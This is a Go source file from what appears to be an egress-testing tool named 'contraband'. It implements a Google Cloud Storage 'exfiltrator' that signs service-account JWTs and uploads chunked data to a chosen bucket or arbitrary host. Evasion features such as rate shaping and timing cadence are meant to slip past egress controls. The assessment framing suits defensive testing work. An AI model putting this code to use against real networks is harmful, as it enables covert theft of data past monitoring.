package cloud

import (
	"bytes"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoGCPGCS, NewGCPGCSExfiltrator())
}

// GCPGCSExfiltrator implements pure-Go Google Cloud Storage REST JSON API exfiltration.
type GCPGCSExfiltrator struct{}

func NewGCPGCSExfiltrator() *GCPGCSExfiltrator {
	return &GCPGCSExfiltrator{}
}

func (e *GCPGCSExfiltrator) Protocol() string {
	return common.ProtoGCPGCS
}

// CreateGCPJWT generates a signed RS256 JWT for service account authentication.
func CreateGCPJWT(clientEmail string, privateKeyPEM []byte, aud string) (string, error) {
	block, _ := pem.Decode(privateKeyPEM)
	if block == nil {
		return "", fmt.Errorf("failed to decode PEM block for private key")
	}

	var parsedKey interface{}
	var err error
	parsedKey, err = x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		parsedKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return "", fmt.Errorf("failed to parse RSA private key: %w", err)
		}
	}

	rsaKey, ok := parsedKey.(*rsa.PrivateKey)
	if !ok {
		return "", fmt.Errorf("key is not RSA private key")
	}

	now := time.Now().UTC().Unix()
	hdrJSON := `{"alg":"RS256","typ":"JWT"}`
	hdrB64 := base64.RawURLEncoding.EncodeToString([]byte(hdrJSON))

	claims := map[string]interface{}{
		"iss":   clientEmail,
		"sub":   clientEmail,
		"aud":   aud,
		"scope": "https://www.googleapis.com/auth/devstorage.read_write",
		"iat":   now,
		"exp":   now + 3600,
	}
	claimsBytes, _ := json.Marshal(claims)
	claimsB64 := base64.RawURLEncoding.EncodeToString(claimsBytes)

	signingInput := hdrB64 + "." + claimsB64
	h := sha256.Sum256([]byte(signingInput))
	sig, err := rsa.SignPKCS1v15(rand.Reader, rsaKey, crypto.SHA256, h[:])
	if err != nil {
		return "", fmt.Errorf("failed to sign JWT: %w", err)
	}
	sigB64 := base64.RawURLEncoding.EncodeToString(sig)

	return signingInput + "." + sigB64, nil
}

func (e *GCPGCSExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	bucket := opts.Headers["gcp_bucket"]
	if bucket == "" {
		bucket = opts.Headers["bucket"]
	}
	if bucket == "" {
		bucket = "contraband-exfil"
	}
	destroy := strings.EqualFold(opts.Headers["destroy"], "true") || strings.EqualFold(opts.Headers["auto_cleanup"], "true")

	// Resolve Bearer Token
	bearerToken := opts.Headers["gcp_token"]
	if bearerToken == "" {
		bearerToken = opts.Headers["bearer_token"]
	}
	if bearerToken == "" {
		bearerToken = opts.Headers["token"]
	}
	if bearerToken == "" {
		saEmail := opts.Headers["service_account_email"]
		saKey := opts.Headers["service_account_key"]
		if saEmail != "" && saKey != "" {
			jwt, jwtErr := CreateGCPJWT(saEmail, []byte(saKey), "https://oauth2.googleapis.com/token")
			if jwtErr == nil {
				bearerToken = jwt
			}
		}
	}
	if bearerToken == "" {
		bearerToken = "ya29.contraband-synthetic-oauth-token-egress-assessment"
	}

	scheme := "https"
	if !opts.UseTLS {
		scheme = "http"
	}
	var targetBase string
	if strings.Contains(opts.TargetHost, "googleapis.com") {
		targetBase = "https://storage.googleapis.com"
	} else {
		targetBase = fmt.Sprintf("%s://%s:%d", scheme, opts.TargetHost, opts.TargetPort)
	}

	client := &http.Client{Timeout: opts.Timeout}
	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var uploadedKeys []string
	var headEvidence []byte

	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyCloudError(err)
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if len(headEvidence) < 1024 {
			take := 1024 - len(headEvidence)
			if take > len(chunkFrame) {
				take = len(chunkFrame)
			}
			headEvidence = append(headEvidence, chunkFrame[:take]...)
		}

		objectKey := fmt.Sprintf("contraband_%s_part%d.dat", opts.SessionToken.String(), seq)
		uploadedKeys = append(uploadedKeys, objectKey)

		uploadURL := fmt.Sprintf("%s/upload/storage/v1/b/%s/o?uploadType=media&name=%s", targetBase, bucket, objectKey)

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCloudError(err)
				result.ErrorMessage = err.Error()
				calculateCloudDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCloudError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCloudDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, uploadURL, bytes.NewReader(chunkFrame))
		if reqErr != nil {
			result.Verdict = classifyCloudError(reqErr)
			result.ErrorMessage = reqErr.Error()
			calculateCloudDurations(&result)
			return &result, reqErr
		}
		req.Header.Set("Authorization", "Bearer "+bearerToken)
		req.Header.Set("Content-Type", "application/octet-stream")
		req.Header.Set("Content-Length", strconv.Itoa(len(chunkFrame)))

		resp, doErr := client.Do(req)
		if doErr != nil {
			result.Verdict = classifyCloudError(doErr)
			result.ErrorMessage = doErr.Error()
			calculateCloudDurations(&result)
			return &result, doErr
		}
		respBody, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()

		result.BytesSent += int64(len(chunkFrame))
		result.BytesRecv += int64(len(respBody))

		if resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusUnauthorized {
			err := fmt.Errorf("GCP GCS upload rejected: HTTP %d Forbidden/Unauthorized", resp.StatusCode)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusNoContent {
			err := fmt.Errorf("GCP GCS upload returned HTTP %d: %s", resp.StatusCode, string(respBody))
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()

	// Handle --destroy auto-cleanup
	if destroy {
		for _, key := range uploadedKeys {
			deleteURL := fmt.Sprintf("%s/storage/v1/b/%s/o/%s", targetBase, bucket, key)
			delReq, err := http.NewRequestWithContext(ctx, http.MethodDelete, deleteURL, nil)
			if err == nil {
				delReq.Header.Set("Authorization", "Bearer "+bearerToken)
				delResp, delErr := client.Do(delReq)
				if delErr == nil {
					_ = delResp.Body.Close()
				}
			}
		}
	}

	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	if opts.ExpectedHash != "" {
		result.PayloadHash = opts.ExpectedHash
	} else {
		result.PayloadHash = chunker.PayloadHashHex()
	}
	result.TargetVolume = result.BytesSent
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	calculateCloudDurations(&result)

	return &result, nil
}
